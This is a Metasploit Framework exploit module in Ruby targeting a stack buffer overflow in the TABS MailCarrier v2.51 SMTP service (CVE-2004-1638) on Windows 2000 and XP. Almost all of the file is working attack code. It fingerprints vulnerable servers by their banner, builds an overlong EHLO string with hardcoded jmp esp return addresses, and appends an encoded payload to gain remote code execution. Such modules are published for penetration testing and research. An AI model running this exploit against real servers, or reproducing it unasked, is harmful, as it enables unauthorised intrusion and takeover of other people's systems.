##
# $Id: mailcarrier_smtp_ehlo.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'		=> 'TABS MailCarrier v2.51 SMTP EHLO Overflow',
			'Description'	=> %q{
					This module exploits the MailCarrier v2.51 suite SMTP service.
				The stack is overwritten when sending an overly long EHLO command.
			},
			'Author' 	    => [ 'Patrick Webster <patrick[at]aushack.com>' ],
			'License'       => MSF_LICENSE,
			'Version'       => '$Revision: 9179 $',
			'References'    =>
			[
				[ 'CVE', '2004-1638' ],
				[ 'OSVDB', '11174' ],
				[ 'BID', '11535' ],
				[ 'URL', 'http://milw0rm.com/exploits/598' ],
			],
			'Platform'      => ['win'],
			'Arch'		    => [ ARCH_X86 ],
			'Privileged'		=> true,
			'DefaultOptions'	=>
				{
					'EXITFUNC' 	=> 'thread',
				},
			'Payload' =>
				{
					'Space'			=> 300,
					'BadChars' 		=> "\x00\x0a\x0d:",
					'StackAdjustment'	=> -3500,
				},
			'Targets' =>
				[
					# Patrick - Tested OK 2007/08/05 : w2ksp0, w2ksp4, xpsp0, xpsp2 en.
					[ 'Windows 2000 SP0 - XP SP1 - EN/FR/GR', { 'Ret' => 0x0fa14c63	} ], # jmp esp expsrv.dll w2ksp0 - xpsp1
					[ 'Windows XP SP2 - EN', 		  { 'Ret' => 0x0fa14ccf } ], # jmp esp expsrv.dll xpsp2 en
				],
			'DisclosureDate' => 'Oct 26 2004',
			'DefaultTarget' => 0))

		register_options(
			[
				Opt::RPORT(25),
				Opt::LHOST(), # Required for stack offset
			], self.class)
	end

	def check
		connect
		banner = sock.get_once(-1,3)
		disconnect

		if (banner =~ /ESMTP TABS Mail Server for Windows NT/)
			return Exploit::CheckCode::Appears
		end
		return Exploit::CheckCode::Safe
	end

	def exploit
		connect

		sploit = "EHLO " + rand_text_alphanumeric(5106 - datastore['LHOST'].length, payload_badchars)
		sploit << [target['Ret']].pack('V') + payload.encoded

		sock.put(sploit + "\r\n")

		handler
		disconnect
	end

end